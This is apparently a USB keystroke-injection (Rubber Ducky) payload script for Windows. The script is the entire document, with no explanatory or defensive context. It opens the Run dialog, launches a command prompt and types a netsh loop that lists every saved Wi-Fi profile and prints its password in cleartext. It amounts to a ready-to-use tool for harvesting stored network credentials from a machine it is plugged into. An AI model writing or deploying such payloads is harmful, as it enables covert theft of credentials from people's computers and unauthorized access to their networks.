DEFAULT_DELAY 500

REM Open Run dialog from Start
GUI r

REM Type "cmd" and press Enter
STRING cmd
ENTER

Delay 700
STRING for /f "skip=9 tokens=1,* delims=:" %i in ('netsh wlan show profiles') do @for /f "tokens=* delims= " %k in ("%j") do @netsh wlan show profile name="%k" key=clear | findstr /i "SSID Content" | findstr /v "Number"
ENTER
